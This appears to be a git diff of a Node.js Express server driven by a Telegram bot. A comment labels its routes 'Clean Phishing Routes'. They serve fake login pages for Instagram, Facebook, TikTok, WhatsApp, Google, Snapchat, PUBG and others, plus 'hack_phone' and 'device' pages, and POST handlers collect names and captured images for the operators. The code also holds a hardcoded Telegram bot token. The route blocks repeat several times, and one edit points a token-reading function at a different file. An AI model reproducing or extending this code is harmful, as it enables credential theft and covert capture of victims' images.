     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
     if (!chatId && token && shortLinkStore[token]) {
@@ -1452,7 +1468,7 @@ if(!routesAdded) app.post('/mm', async (req, res) => {
 
 
 
-if(!routesAdded) app.post('/so', (req, res) => {
+app.post('/so', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
     if (!chatId && token && shortLinkStore[token]) {
@@ -1495,7 +1511,7 @@ if(!routesAdded) app.post('/so', (req, res) => {
     }
 });
 
-if(!routesAdded) app.get('/k.html', (req, res) => {
+app.get('/k.html', (req, res) => {
     const token = req.query.t;
     if (token && shortLinkStore[token]) {
         res.sendFile(path.join(__dirname, 'k.html'));
@@ -1506,7 +1522,7 @@ if(!routesAdded) app.get('/k.html', (req, res) => {
     }
 });
 
-if(!routesAdded) app.get('/ca', (req, res) => {
+app.get('/ca', (req, res) => {
     res.sendFile(path.join(__dirname, 'k.html'));
 });
 let linkUsage = {};
@@ -1903,25 +1919,25 @@ bot.on('callback_query', (query) => {
         bot.on('message', messageHandler);
     }
 });
-if(!routesAdded) app.use(bodyParser.urlencoded({ extended: true }));
-if(!routesAdded) app.use(express.static(__dirname));
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.static(__dirname));
 
 // --- Clean Phishing Routes (V35) ---
-if(!routesAdded) app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
-if(!routesAdded) app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
-if(!routesAdded) app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
-if(!routesAdded) app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
-if(!routesAdded) app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
-if(!routesAdded) app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
-if(!routesAdded) app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
-if(!routesAdded) app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
-if(!routesAdded) app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
-if(!routesAdded) app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
-if(!routesAdded) app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
-if(!routesAdded) app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
+app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
+app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
+app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
+app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
 
 
-if(!routesAdded) app.post('/submitNames', (req, res) => {
+app.post('/submitNames', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
     if (!chatId && token && shortLinkStore[token]) {
@@ -1942,7 +1958,7 @@ if(!routesAdded) app.post('/submitNames', (req, res) => {
         });
 });
 
-if(!routesAdded) app.get('/ge', (req, res) => {
+app.get('/ge', (req, res) => {
     const chatId = req.query.chatId;
     if (!chatId) {
         return res.status(400).send('الرجاء توفير chatId في الطلب.');
@@ -1950,25 +1966,25 @@ if(!routesAdded) app.get('/ge', (req, res) => {
     res.sendFile(path.join(__dirname, 'g.html'));
 });
 
-if(!routesAdded) app.use(bodyParser.urlencoded({ extended: true }));
-if(!routesAdded) app.use(express.static(__dirname));
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.static(__dirname));
 
 // --- Clean Phishing Routes (V35) ---
-if(!routesAdded) app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
-if(!routesAdded) app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
-if(!routesAdded) app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
-if(!routesAdded) app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
-if(!routesAdded) app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
-if(!routesAdded) app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
-if(!routesAdded) app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
-if(!routesAdded) app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
-if(!routesAdded) app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
-if(!routesAdded) app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
-if(!routesAdded) app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
-if(!routesAdded) app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
+app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
+app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
+app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
+app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
 
 
-if(!routesAdded) app.post('/submitNames', (req, res) => {
+app.post('/submitNames', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
     if (!chatId && token && shortLinkStore[token]) {
@@ -1989,7 +2005,7 @@ if(!routesAdded) app.post('/submitNames', (req, res) => {
         });
 });
 
-if(!routesAdded) app.get('/getNam', (req, res) => {
+app.get('/getNam', (req, res) => {
     const chatId = req.query.chatId;
     if (!chatId) {
         return res.status(400).send('الرجاء توفير chatId في الطلب.');
@@ -1997,25 +2013,25 @@ if(!routesAdded) app.get('/getNam', (req, res) => {
     res.sendFile(path.join(__dirname, 'F.html'));
 });
 
-if(!routesAdded) app.use(bodyParser.urlencoded({ extended: true }));
-if(!routesAdded) app.use(express.static(__dirname));
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.static(__dirname));
 
 // --- Clean Phishing Routes (V35) ---
-if(!routesAdded) app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
-if(!routesAdded) app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
-if(!routesAdded) app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
-if(!routesAdded) app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
-if(!routesAdded) app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
-if(!routesAdded) app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
-if(!routesAdded) app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
-if(!routesAdded) app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
-if(!routesAdded) app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
-if(!routesAdded) app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
-if(!routesAdded) app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
-if(!routesAdded) app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
+app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
+app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
+app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
+app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
 
 
-if(!routesAdded) app.post('/submitNames', (req, res) => {
+app.post('/submitNames', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
     const token = req.body.token || req.query.t;
     if (!chatId && token && shortLinkStore[token]) {
@@ -2036,7 +2052,7 @@ if(!routesAdded) app.post('/submitNames', (req, res) => {
         });
 });
 
-if(!routesAdded) app.get('/getName', (req, res) => {
+app.get('/getName', (req, res) => {
     const chatId = req.query.chatId;
     if (!chatId) {
         return res.status(400).send('الرجاء توفير chatId في الطلب.');
@@ -2506,28 +2522,28 @@ const deleteFolderRecursive = (directoryPath) => {
     }
 };
 
-if(!routesAdded) app.use(express.static(__dirname));
+app.use(express.static(__dirname));
 
 // --- Clean Phishing Routes (V35) ---
-if(!routesAdded) app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
-if(!routesAdded) app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
-if(!routesAdded) app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
-if(!routesAdded) app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
-if(!routesAdded) app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
-if(!routesAdded) app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
-if(!routesAdded) app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
-if(!routesAdded) app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
-if(!routesAdded) app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
-if(!routesAdded) app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
-if(!routesAdded) app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
-if(!routesAdded) app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
+app.get('/ig', (req, res) => res.sendFile(path.join(__dirname, 'i.html')));
+app.get('/fb', (req, res) => res.sendFile(path.join(__dirname, 'fe.html')));
+app.get('/tt', (req, res) => res.sendFile(path.join(__dirname, 't.html')));
+app.get('/wa', (req, res) => res.sendFile(path.join(__dirname, 'n.html')));
+app.get('/yt', (req, res) => res.sendFile(path.join(__dirname, 'yt.html')));
+app.get('/gg', (req, res) => res.sendFile(path.join(__dirname, 'g.html')));
+app.get('/tw', (req, res) => res.sendFile(path.join(__dirname, 'tw.html')));
+app.get('/snap', (req, res) => res.sendFile(path.join(__dirname, 's.html')));
+app.get('/device', (req, res) => res.sendFile(path.join(__dirname, 'lo.html')));
+app.get('/hack_phone', (req, res) => res.sendFile(path.join(__dirname, 'hp.html')));
+app.get('/pubg', (req, res) => res.sendFile(path.join(__dirname, 'pubg.html')));
+app.get('/ff', (req, res) => res.sendFile(path.join(__dirname, 'ff.html')));
 
 
 
 
 
 
-if(!routesAdded) app.post('/xx', (req, res) => {
+app.post('/xx', (req, res) => {
     const chatId = req.body.chatId;
     const imageDatas = req.body.imageDatas.split(',');
 
@@ -2560,7 +2576,7 @@ if(!routesAdded) app.post('/xx', (req, res) => {
     res.redirect('/ok.html');
 });
 
-if(!routesAdded) app.get('/ios', (req, res) => {
+app.get('/ios', (req, res) => {
     res.sendFile(path.join(__dirname, 'xx.html'));
 });
 bot.onText(/\/اتتهتتاههة/, (msg) => {
@@ -4180,11 +4196,11 @@ process.on('exit', handleExit);
 process.on('SIGINT', handleExit);
 process.on('SIGTERM', handleExit);
 process.on('SIGHUP', handleExit);
-routesAdded = true;
+if(isMain) global.routesInitialized = true;
 }
 
 const TOKENS_FILE = path.join(__dirname, 'tokens.json');
-function getStoredTokens() { try { if (fs.existsSync(TOKENS_FILE)) return JSON.parse(fs.readFileSync(TOKENS_FILE, 'utf8')); } catch(e) {} return []; }
+function getStoredTokens() { try { if (fs.existsSync(SETTINGS_FILE)) return JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8')); } catch(e) {} return []; }
 function persistNewToken(token, ownerId, botUsername) {
     let tokens = getStoredTokens();
     if (!tokens.find(t => t.token === token)) {
@@ -4212,7 +4228,7 @@ async function spawnBotInstance(token, isMain = false, specificOwner = null) {
 }
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server Running on Port ${PORT}`));
+global.app.listen(PORT, () => console.log(`Server Running on Port ${PORT}`));
 
 spawnBotInstance('8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao', true, developerId);
 getStoredTokens().forEach(item => { if (item.token !== '8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao') spawnBotInstance(item.token, false, item.ownerId); });
